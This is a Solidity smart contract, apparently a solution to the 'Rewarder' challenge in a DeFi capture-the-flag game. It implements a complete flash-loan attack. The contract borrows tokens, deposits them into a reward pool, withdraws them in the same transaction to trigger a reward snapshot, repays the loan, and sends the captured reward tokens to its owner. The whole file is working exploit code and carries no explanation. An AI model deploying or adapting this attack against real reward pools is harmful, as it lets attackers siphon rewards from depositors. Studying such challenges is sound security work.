// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface FlashLoanerPoolInterface {
    function flashLoan(uint256 amount) external;
}

interface TheRewarderPoolInterface {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface DamnTokenInterface {
    function approve(address spender, uint256 amount) external;
    function transfer(address recipient, uint256 amount) external returns (bool);

}

interface RewardTokenInterface {
    function approve(address spender, uint256 amount) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);

}

contract RewarderAttacker {
    address pool;
    address rewarder;
    address token;
    address rewardToken;
    address owner;
    constructor (address poolAddress, address rewarderAddress, address damnTokenAddress, address rewardTokenAddress){
        owner = msg.sender;
        pool = poolAddress;
        rewarder = rewarderAddress;
        token = damnTokenAddress;
        rewardToken = rewardTokenAddress;
    }

    function receiveFlashLoan(uint256 amount) external payable{
        DamnTokenInterface(token).approve(address(rewarder), amount);
        TheRewarderPoolInterface(rewarder).deposit(amount);
        TheRewarderPoolInterface(rewarder).withdraw(amount);
        bool payback = DamnTokenInterface(token).transfer(pool, amount);
        require(payback, "Payback failed");
        bool getReward = RewardTokenInterface(rewardToken).transfer(owner, RewardTokenInterface(rewardToken).balanceOf(address(this)));
        require(getReward, "getReward failed");
    }


    function attackRewarder(uint256 amount) public {
        FlashLoanerPoolInterface(pool).flashLoan(amount);
    }

    receive() external payable {}
}